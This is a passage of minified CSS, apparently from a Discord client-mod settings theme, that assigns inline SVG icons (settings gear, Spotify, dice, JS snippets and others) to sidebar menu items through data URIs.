8,5V4A2,2 0 0,1 10,2H14A2,2 0 0,1 16,4V5A1,1 0 0,1 15,6V7.81L20.5,17.37C20.82,17.84 21,18.4 21,19A3,3 0 0,1 18,22H6M5,19A1,1 0 0,0 6,20H18A1,1 0 0,0 19,19C19,18.79 18.93,18.59 18.82,18.43L16.53,14.47L14,17L8.93,11.93L5.18,18.43C5.07,18.59 5,18.79 5,19M13,10A1,1 0 0,0 12,11A1,1 0 0,0 13,12A1,1 0 0,0 14,11A1,1 0 0,0 13,10Z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=Experiments]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' enable-background='new 0 0 24 24' height='24' viewBox='0 0 24 24' fill='white' width='24'%3E%3Cg%3E%3Crect fill='none' height='24' width='24'/%3E%3C/g%3E%3Cg%3E%3Cg%3E%3Cpath d='M7,19c-1.1,0-2,0.9-2,2h14c0-1.1-0.9-2-2-2h-4v-2h3c1.1,0,2-0.9,2-2h-8c-1.66,0-3-1.34-3-3c0-1.09,0.59-2.04,1.46-2.56 C8.17,9.03,8,8.54,8,8c0-0.21,0.04-0.42,0.09-0.62C6.28,8.13,5,9.92,5,12c0,2.76,2.24,5,5,5v2H7z'/%3E%3Cpath d='M10.56,5.51C11.91,5.54,13,6.64,13,8c0,0.75-0.33,1.41-0.85,1.87l0.59,1.62l0.94-0.34l0.34,0.94l1.88-0.68l-0.34-0.94 l0.94-0.34L13.76,2.6l-0.94,0.34L12.48,2L10.6,2.68l0.34,0.94L10,3.97L10.56,5.51z'/%3E%3Ccircle cx='10.5' cy='8' r='1.5'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=DeveloperOptions]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='24' viewBox='0 0 24 24' fill='white' width='24'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-general]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' enable-background='new 0 0 24 24' viewBox='0 0 24 24' fill='white' width='18px' height='18px'%3E%3Cg%3E%3Cpath d='M0,0h24v24H0V0z' fill='none'/%3E%3Cpath d='M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.07-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.74,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.07,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.44-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.47-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z'/%3E%3C/g%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-clickableEdits]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23fff' width='18' height='18'%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3Cpath d='M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a.996.996 0 000-1.41l-2.34-2.34a.996.996 0 00-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-spotify]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm4.059 14.406c-.192 0-.286-.093-.473-.187-1.41-.848-3.195-1.317-5.078-1.317-1.035 0-2.164.188-3.106.375-.187 0-.375.094-.468.094a.64.64 0 01-.657-.656c0-.38.188-.66.563-.66 1.223-.282 2.445-.47 3.762-.47 2.164 0 4.14.563 5.832 1.505.187.187.378.281.378.656-.19.473-.472.66-.753.66zm1.03-2.633c-.187 0-.374-.093-.562-.187-1.597-1.035-3.855-1.602-6.3-1.602-1.223 0-2.356.192-3.2.38-.187.093-.28.093-.468.093a.744.744 0 01-.754-.754c0-.469.187-.656.656-.848 1.129-.28 2.258-.562 3.86-.562 2.632 0 5.077.656 7.148 1.879.281.187.468.473.468.754-.093.469-.375.847-.847.847zm1.224-3.011c-.188 0-.282-.094-.563-.188-1.883-1.035-4.61-1.691-7.242-1.691-1.317 0-2.73.187-3.953.469-.188 0-.282.093-.563.093-.562.094-.941-.375-.941-.941 0-.563.281-.848.66-.941C7.215 7.188 8.812 7 10.508 7c2.914 0 5.926.656 8.277 1.883.281.187.563.469.563.937-.094.567-.47.942-1.035.942zm0 0' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-emojiUtility]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' width='24' height='24'%3E%3Cpath fill='white' d='M12 2C6.477 2 2 6.477 2 12c0 5.522 4.477 10 10 10s10-4.478 10-10c0-5.523-4.477-10-10-10zM8 6a2 2 0 11-.001 4.001A2 2 0 018 6zm10 8c0 2.617-2.86 5-6 5s-6-2.383-6-5v-1h12v1zm-2-4a2 2 0 110-4 2 2 0 010 4z'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=undertale-dialog-generator]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg version='1.0' xmlns='http://www.w3.org/2000/svg' width='533.333' height='533.333' fill='%23fff' viewBox='0 0 400 400'%3E%3Cpath d='M50 12.5V25H24v25H0v201h50v50h50v49h50v50h100v-50h50v-49h50v-50h50V50h-24V25h-26V0h-50v25h-50v25h-25v50h-50V50h-25V25h-50V0H50v12.5z'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=bdCompat]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1.5 7.77l3.521 3.174.02-3.035.015-3.035h1.178c1.248 0 1.632.063 2.03.35.655.467.668 1.576.027 2.071-.397.3-.69.363-1.645.37h-.893v2.651h.865c1.199 0 1.7.196 2 .789.328.634.105 1.367-.522 1.758l-.342.21-6.254.041v2.853h3.019c1.66 0 3.284-.034 3.605-.07 2.112-.258 3.437-1.192 3.918-2.755.195-.621.21-1.863.035-2.526-.126-.488-.39-1.053-.655-1.402l-.168-.223.168-.23c.878-1.166 1.045-3.112.39-4.494-.314-.67-.927-1.255-1.68-1.618-1.179-.565-1.8-.635-5.648-.635H1.5V7.77zm9.461-5.477a4.46 4.46 0 011.813 2.512c.112.411.126.781.126 4.186 0 3.363-.014 3.774-.126 4.179a4.49 4.49 0 01-1.827 2.54l-.418.271.872-.034c2.726-.126 4.546-1.424 4.978-3.552.058-.276.095-1.13.111-2.146.013-.8.013-1.7 0-2.495-.015-.978-.05-1.8-.104-2.084-.195-1.019-.74-1.926-1.527-2.519-.914-.69-2.015-1.046-3.458-1.11L10.529 2l.432.293z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M16.49 7.754v2.495c-.016 1.016-.053 1.87-.111 2.146-.432 2.128-2.252 3.426-4.978 3.552l-.872.034.418-.272a4.49 4.49 0 001.827-2.54c.112-.404.126-.816.126-4.178 0-3.405-.014-3.775-.126-4.186a4.46 4.46 0 00-1.813-2.512L10.53 2l.872.042c1.443.063 2.544.418 3.458 1.11.788.592 1.332 1.5 1.527 2.518.054.284.089 1.106.104 2.084zM1.5 13.114v2.853h3.019c1.66 0 3.284-.034 3.605-.07 2.112-.258 3.437-1.192 3.918-2.755.195-.621.21-1.863.035-2.526-.126-.488-.39-1.053-.655-1.402l-.168-.223.168-.23c.878-1.166 1.045-3.112.39-4.494-.314-.67-.927-1.255-1.68-1.618-1.179-.565-1.8-.635-5.648-.635H1.5V7.77l3.521 3.174.02-3.035.015-3.035h1.178c1.248 0 1.632.063 2.03.35.655.467.668 1.576.027 2.071-.397.3-.69.363-1.645.37h-.893v2.651h.865c1.199 0 1.7.196 2 .789.328.634.105 1.367-.522 1.758l-.342.21-6.254.041z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M5.021 10.944l.02-3.035.015-3.035h1.178c1.248 0 1.632.063 2.03.35.655.467.668 1.576.027 2.071-.397.3-.69.363-1.645.37h-.893v2.651h.865c1.199 0 1.7.196 2 .789.328.634.105 1.367-.522 1.758l-.342.21-6.254.041v2.853h3.019c1.66 0 3.284-.034 3.605-.07 2.112-.258 3.437-1.192 3.918-2.755.195-.621.21-1.863.035-2.526-.126-.488-.39-1.053-.655-1.402l-.168-.223.168-.23c.878-1.166 1.045-3.112.39-4.494-.314-.67-.927-1.255-1.68-1.618-1.179-.565-1.8-.635-5.648-.635H1.5V7.77l3.521 3.174zm5.94-8.651a4.46 4.46 0 011.813 2.512c.112.411.126.781.126 4.186 0 3.363-.014 3.774-.126 4.179a4.49 4.49 0 01-1.827 2.54l-.418.271.872-.034c2.726-.126 4.546-1.424 4.978-3.552.058-.276.095-1.13.111-2.146.013-.8.013-1.7 0-2.495-.015-.978-.05-1.8-.104-2.084-.195-1.019-.74-1.926-1.527-2.519-.914-.69-2.015-1.046-3.458-1.11L10.529 2l.432.293z' fill='%23fff'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=dice-command]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M15.8 7.4C16.4627 7.4 17 7.93725 17 8.6V14.2C17 14.8628 16.4627 15.4 15.8 15.4H10.2C9.53725 15.4 9 14.8628 9 14.2V13.0395L12.4065 9.633C13.0095 9.03 13.1488 8.13975 12.8315 7.4H15.8ZM7.4675 2.95925L11.8408 7.3325C12.3198 7.8115 12.3198 8.58825 11.8408 9.0675L7.46725 13.4408C6.98825 13.9198 6.2115 13.9198 5.7325 13.4408L1.35925 9.06725C0.88025 8.58825 0.88025 7.8115 1.35925 7.3325L5.73275 2.95925C6.21175 2.48025 6.9885 2.48025 7.4675 2.95925ZM7.59961 5.00039C7.59961 5.55268 7.15189 6.00039 6.59961 6.00039C6.04732 6.00039 5.59961 5.55268 5.59961 5.00039C5.59961 4.44811 6.04732 4.00039 6.59961 4.00039C7.15189 4.00039 7.59961 4.44811 7.59961 5.00039ZM3.40042 9.19961C2.84812 9.19961 2.40039 8.75189 2.40039 8.19961C2.40039 7.64732 2.84812 7.19961 3.40042 7.19961C3.95271 7.19961 4.40044 7.64732 4.40044 8.19961C4.40044 8.75189 3.95271 9.19961 3.40042 9.19961ZM7.59961 11.4008C7.59961 11.9531 7.15189 12.4008 6.59961 12.4008C6.04732 12.4008 5.59961 11.9531 5.59961 11.4008C5.59961 10.8485 6.04732 10.4008 6.59961 10.4008C7.15189 10.4008 7.59961 10.8485 7.59961 11.4008ZM9.7998 9.19961C10.3521 9.19961 10.7998 8.75189 10.7998 8.19961C10.7998 7.64732 10.3521 7.19961 9.7998 7.19961C9.24752 7.19961 8.7998 7.64732 8.7998 8.19961C8.7998 8.75189 9.24752 9.19961 9.7998 9.19961ZM7.59961 8.19961C7.59961 8.75189 7.15189 9.19961 6.59961 9.19961C6.04732 9.19961 5.59961 8.75189 5.59961 8.19961C5.59961 7.64732 6.04732 7.19961 6.59961 7.19961C7.15189 7.19961 7.59961 7.64732 7.59961 8.19961ZM13 12.4008C13.5523 12.4008 14 11.9531 14 11.4008C14 10.8485 13.5523 10.4008 13 10.4008C12.4477 10.4008 12 10.8485 12 11.4008C12 11.9531 12.4477 12.4008 13 12.4008Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M15.8 7.4H12.8315C13.1488 8.13975 13.0095 9.03 12.4065 9.633L9 13.0395V14.2C9 14.8628 9.53725 15.4 10.2 15.4H15.8C16.4627 15.4 17 14.8628 17 14.2V8.6C17 7.93725 16.4627 7.4 15.8 7.4ZM11.8408 7.3325L7.4675 2.95925C6.9885 2.48025 6.21175 2.48025 5.73275 2.95925L1.35925 7.3325C0.88025 7.8115 0.88025 8.58825 1.35925 9.06725L5.7325 13.4408C6.2115 13.9198 6.98825 13.9198 7.46725 13.4408L11.8408 9.0675C12.3198 8.58825 12.3198 7.8115 11.8408 7.3325ZM7.59961 5.00039C7.59961 5.55268 7.15189 6.00039 6.59961 6.00039C6.04732 6.00039 5.59961 5.55268 5.59961 5.00039C5.59961 4.44811 6.04732 4.00039 6.59961 4.00039C7.15189 4.00039 7.59961 4.44811 7.59961 5.00039ZM6.59961 9.19961C7.15189 9.19961 7.59961 8.75189 7.59961 8.19961C7.59961 7.64732 7.15189 7.19961 6.59961 7.19961C6.04732 7.19961 5.59961 7.64732 5.59961 8.19961C5.59961 8.75189 6.04732 9.19961 6.59961 9.19961ZM2.40039 8.19961C2.40039 8.75189 2.84812 9.19961 3.40042 9.19961C3.95271 9.19961 4.40044 8.75189 4.40044 8.19961C4.40044 7.64732 3.95271 7.19961 3.40042 7.19961C2.84812 7.19961 2.40039 7.64732 2.40039 8.19961ZM6.59961 12.4008C7.15189 12.4008 7.59961 11.9531 7.59961 11.4008C7.59961 10.8485 7.15189 10.4008 6.59961 10.4008C6.04732 10.4008 5.59961 10.8485 5.59961 11.4008C5.59961 11.9531 6.04732 12.4008 6.59961 12.4008ZM10.7998 8.19961C10.7998 8.75189 10.3521 9.19961 9.7998 9.19961C9.24752 9.19961 8.7998 8.75189 8.7998 8.19961C8.7998 7.64732 9.24752 7.19961 9.7998 7.19961C10.3521 7.19961 10.7998 7.64732 10.7998 8.19961ZM13 12.4008C13.5523 12.4008 14 11.9531 14 11.4008C14 10.8485 13.5523 10.4008 13 10.4008C12.4477 10.4008 12 10.8485 12 11.4008C12 11.9531 12.4477 12.4008 13 12.4008Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=relaunch]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Cdefs/%3E%3Cpath fill='%23fff' d='M371 133a168 168 0 00-278 82c-1 5-6 9-12 9H24c-7 0-13-7-12-14A248 248 0 01427 77l36-36c15-15 41-4 41 17v134c0 13-11 24-24 24H346c-21 0-32-26-17-41l42-42zM32 296h134c21 0 32 26 17 41l-42 42a168 168 0 00278-82c1-5 6-9 12-9h57c7 0 13 7 12 14A248 248 0 0185 435l-36 36c-15 15-41 4-41-17V320c0-13 11-24 24-24z'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=ian-settings]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='18.976' height='15.975' overflow='visible'%3E%3Cpath fill='%23fff' d='M17.192.5H1.785C1.075.5.5 1.076.5 1.784v7.372c0 .71.575 1.284 1.285 1.284h11.08l4.327 4.327V10.44c.71 0 1.284-.574 1.284-1.284V1.784c0-.708-.574-1.284-1.284-1.284z'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=alias]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M3.5 12.5h-2a.5.5 0 00-.5.5v2a.5.5 0 00.5.5h2A.5.5 0 004 15v-2a.5.5 0 00-.5-.5zm0-10h-2A.5.5 0 001 3v2a.5.5 0 00.5.5h2A.5.5 0 004 5V3a.5.5 0 00-.5-.5zm0 5h-2A.5.5 0 001 8v2a.5.5 0 00.5.5h2A.5.5 0 004 10V8a.5.5 0 00-.5-.5zm13 5.5h-10a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h10a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5zm0-10h-10a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h10a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5zm0 5h-10a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h10a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M3.5 12.5h-2a.5.5 0 00-.5.5v2a.5.5 0 00.5.5h2A.5.5 0 004 15v-2a.5.5 0 00-.5-.5zm0-10h-2A.5.5 0 001 3v2a.5.5 0 00.5.5h2A.5.5 0 004 5V3a.5.5 0 00-.5-.5zm0 5h-2A.5.5 0 001 8v2a.5.5 0 00.5.5h2A.5.5 0 004 10V8a.5.5 0 00-.5-.5zm13 5.5h-10a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h10a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5zm0-10h-10a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h10a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5zm0 5h-10a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h10a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=game-activity-toggle]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M9.708 5.604V1.708h-4.25v3.896L7.583 7.73l2.125-2.125zM4.396 6.667H.5v4.25h3.896L6.52 8.792 4.396 6.667zm1.062 5.312v3.896h4.25v-3.896L7.583 9.854 5.458 11.98z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M13.958 1a3.542 3.542 0 00-3.541 3.542v8.5a3.542 3.542 0 107.083 0v-8.5A3.542 3.542 0 0013.958 1zm0 6.198a2.48 2.48 0 100-4.958 2.48 2.48 0 000 4.958z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M9.708 1.708v3.896L7.583 7.73 5.458 5.604V1.708h4.25zM.5 6.667h3.896L6.52 8.792l-2.125 2.125H.5v-4.25zm4.958 9.208v-3.896l2.125-2.125 2.125 2.125v3.896h-4.25zM17.5 4.542a3.542 3.542 0 00-7.083 0v8.5a3.542 3.542 0 107.083 0v-8.5zm-3.542 2.656a2.48 2.48 0 100-4.958 2.48 2.48 0 000 4.958z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=itc-settings]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M14.667 13.333v.473c0 .782-.635 1.416-1.417 1.416H1.917A1.417 1.417 0 01.5 13.806V6.25c0-.782.634-1.417 1.417-1.417h.472v6.14a2.364 2.364 0 002.361 2.36h9.917zm2.833-2.36V3.416C17.5 2.634 16.866 2 16.083 2H4.75c-.782 0-1.417.634-1.417 1.417v7.555c0 .783.635 1.417 1.417 1.417h11.333c.783 0 1.417-.634 1.417-1.417zm-9.444-6.14a1.417 1.417 0 11-2.834 0 1.417 1.417 0 012.834 0zm-2.834 4.25l1.639-1.638a.354.354 0 01.5 0L8.529 8.61l4-4a.354.354 0 01.5 0l2.583 2.583V10.5H5.222V9.083z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M6.639 6.25a1.417 1.417 0 100-2.833 1.417 1.417 0 000 2.833zm8.028 7.556v-.473H4.75a2.364 2.364 0 01-2.361-2.36v-6.14h-.472C1.134 4.833.5 5.468.5 6.25v7.556c0 .782.634 1.416 1.417 1.416H13.25c.782 0 1.417-.634 1.417-1.416zM17.5 3.416v7.556c0 .783-.634 1.417-1.417 1.417H4.75a1.417 1.417 0 01-1.417-1.417V3.417C3.333 2.634 3.968 2 4.75 2h11.333c.783 0 1.417.634 1.417 1.417zM6.86 7.446L5.223 9.083V10.5h10.39V7.194l-2.584-2.582a.354.354 0 00-.5 0l-4 4-1.166-1.167a.354.354 0 00-.501 0z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=JSSnippets]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11.408 7.107c0 1.524-.895 2.22-2.199 2.22-1.178 0-1.86-.608-2.209-1.346l1.199-.723c.23.409.44.755.947.755.483 0 .79-.19.79-.927V2.084h1.472v5.023zm3.482 2.22c-1.367 0-2.251-.65-2.681-1.503l1.199-.692c.314.514.727.895 1.45.895.609 0 1-.304 1-.727 0-.504-.398-.682-1.073-.98l-.367-.157c-1.063-.45-1.765-1.02-1.765-2.22 0-1.104.842-1.943 2.153-1.943.937 0 1.608.325 2.09 1.178l-1.146.734c-.252-.45-.524-.63-.947-.63-.43 0-.703.274-.703.63 0 .44.273.619.905.895l.367.157c1.252.535 1.954 1.084 1.954 2.315 0 1.321-1.041 2.048-2.436 2.048z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M11.408 7.107c0 1.524-.895 2.22-2.199 2.22-1.178 0-1.86-.608-2.209-1.346l1.199-.723c.23.409.44.755.947.755.483 0 .79-.19.79-.927V2.084h1.472v5.023zm3.482 2.22c-1.367 0-2.251-.65-2.681-1.503l1.199-.692c.314.514.727.895 1.45.895.609 0 1-.304 1-.727 0-.504-.398-.682-1.073-.98l-.367-.157c-1.063-.45-1.765-1.02-1.765-2.22 0-1.104.842-1.943 2.153-1.943.937 0 1.608.325 2.09 1.178l-1.146.734c-.252-.45-.524-.63-.947-.63-.43 0-.703.274-.703.63 0 .44.273.619.905.895l.367.157c1.252.535 1.954 1.084 1.954 2.315 0 1.321-1.041 2.048-2.436 2.048z' fill='%23fff'/%3E%3Cpath d='M6.164 10.836V6.235A.234.234 0 005.929 6c-.907 0-1.642.735-1.642 1.642v3.194h-.688a1.877 1.877 0 10-.223 1.877h.91v.91a1.877 1.877 0 101.877-.223v-.687h3.195c.907 0 1.642-.735 1.642-1.642a.234.234 0 00-.235-.235H6.164zm-3.845 1.19a.627.627 0 01-.884-.885.627.627 0 01.884.885zm3.54 3.54a.626.626 0 11-.885-.888.626.626 0 01.885.887z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M.55 10.257c-.367.366-.55.846-.55 1.327a1.877 1.877 0 003.376 1.13h.91v.91a1.877 1.877 0 101.877-.223v-.688h3.195c.907 0 1.642-.735 1.642-1.642a.234.234 0 00-.235-.235H6.164V6.235A.234.234 0 005.929 6c-.907 0-1.642.735-1.642 1.642v3.194h-.688a1.877 1.877 0 00-3.05-.58zm10.858-3.15c0 1.524-.895 2.22-2.199 2.22-1.178 0-1.86-.608-2.209-1.346l1.199-.723c.23.409.44.755.947.755.483 0 .79-.19.79-.927V2.084h1.472v5.023zm3.482 2.22c-1.367 0-2.251-.65-2.681-1.503l1.199-.692c.314.514.727.895 1.45.895.609 0 1-.304 1-.727 0-.504-.398-.682-1.073-.98l-.367-.157c-1.063-.45-1.765-1.02-1.765-2.22 0-1.104.842-1.943 2.153-1.943.937 0 1.608.325 2.09 1.178l-1.146.734c-.252-.45-.524-.63-.947-.63-.43 0-.703.274-.703.63 0 .44.273.619.905.895l.367.157c1.252.535 1.954 1.084 1.954 2.315 0 1.321-1.041 2.048-2.436 2.048zm-12.57 2.7a.627.627 0 01-.885-.886.627.627 0 01.884.885zm2.654 3.538a.626.626 0 10.885-.887.626.626 0 00-.885.887z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=mention-count]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M4.887 5A4.385 4.385 0 00.5 9.387a4.385 4.385 0 006.782 3.676.425.425 0 00.099-.626l-.18-.22a.423.423 0 00-.555-.09 3.259 3.259 0 01-5.013-2.74 3.259 3.259 0 013.254-3.255c1.772 0 3.255 1.02 3.255 2.83 0 .687-.373 1.411-1.029 1.481-.307-.008-.3-.227-.238-.531l.414-2.142a.425.425 0 00-.417-.506h-.795a.24.24 0 00-.238.212v.002c-.26-.317-.716-.385-1.061-.385-1.32 0-2.438 1.1-2.438 2.68 0 1.154.65 1.872 1.698 1.872.477 0 1.015-.277 1.327-.678.168.603.718.603 1.25.603 1.927 0 2.66-1.267 2.66-2.607C9.274 6.55 7.328 5 4.886 5zm-.383 5.385c-.394 0-.638-.276-.638-.72 0-.797.544-1.287 1.037-1.287.394 0 .63.27.63.72 0 .798-.6 1.287-1.03 1.287zM17.374 7.572l.123-.685a.206.206 0 00-.203-.242h-1.282l.25-1.403A.206.206 0 0016.06 5h-.696a.206.206 0 00-.202.17l-.264 1.475h-1.69l.25-1.403A.206.206 0 0013.256 5h-.696a.206.206 0 00-.203.17l-.263 1.475h-1.356a.206.206 0 00-.202.17l-.123.685a.206.206 0 00.203.242h1.282l-.392 2.193h-1.355a.206.206 0 00-.203.17l-.122.685a.206.206 0 00.202.242h1.282l-.25 1.404a.206.206 0 00.202.241h.697a.206.206 0 00.202-.17l.263-1.475h1.69l-.25 1.404a.206.206 0 00.203.241h.696a.205.205 0 00.202-.17l.264-1.475h1.355a.205.205 0 00.203-.17l.122-.685a.206.206 0 00-.202-.242h-1.282l.391-2.193h1.356a.206.206 0 00.202-.17zm-3.063 2.363h-1.69l.391-2.193h1.69l-.391 2.193z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M4.887 5A4.385 4.385 0 00.5 9.387a4.385 4.385 0 006.782 3.676.425.425 0 00.099-.626l-.18-.22a.423.423 0 00-.555-.09 3.259 3.259 0 01-5.013-2.74 3.259 3.259 0 013.254-3.255c1.772 0 3.255 1.02 3.255 2.83 0 .687-.373 1.411-1.029 1.481-.307-.008-.3-.227-.238-.531l.414-2.142a.425.425 0 00-.417-.506h-.795a.24.24 0 00-.238.212v.002c-.26-.317-.716-.385-1.061-.385-1.32 0-2.438 1.1-2.438 2.68 0 1.154.65 1.872 1.698 1.872.477 0 1.015-.277 1.327-.678.168.603.718.603 1.25.603 1.927 0 2.66-1.267 2.66-2.607C9.274 6.55 7.328 5 4.886 5zm12.487 2.572l.123-.685a.206.206 0 00-.203-.242h-1.282l.25-1.403A.206.206 0 0016.06 5h-.696a.206.206 0 00-.202.17l-.264 1.475h-1.69l.25-1.403A.206.206 0 0013.256 5h-.696a.206.206 0 00-.203.17l-.263 1.475h-1.356a.206.206 0 00-.202.17l-.123.685a.206.206 0 00.203.242h1.282l-.392 2.193h-1.355a.206.206 0 00-.203.17l-.122.685a.206.206 0 00.202.242h1.282l-.25 1.404a.206.206 0 00.202.241h.697a.206.206 0 00.202-.17l.263-1.475h1.69l-.25 1.404a.206.206 0 00.203.241h.696a.205.205 0 00.202-.17l.264-1.475h1.355a.205.205 0 00.203-.17l.122-.685a.206.206 0 00-.202-.242h-1.282l.391-2.193h1.356a.206.206 0 00.202-.17zm-3.063 2.363h-1.69l.391-2.193h1.69l-.391 2.193zm-10.445-.27c0 .444.244.72.638.72.43 0 1.028-.49 1.028-1.286 0-.452-.235-.721-.63-.721-.492 0-1.037.49-1.037 1.286z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=multitask]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M2.286 4.286C1.576 4.286 1 4.862 1 5.57V15c0 .71.576 1.286 1.286 1.286h11.143c.71 0 1.285-.576 1.285-1.286v-.429H2.524V4.286h-.238z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M15.714 2H4.571c-.71 0-1.285.576-1.285 1.286V14h12.428c.71 0 1.286-.576 1.286-1.286V3.286C17 2.576 16.424 2 15.714 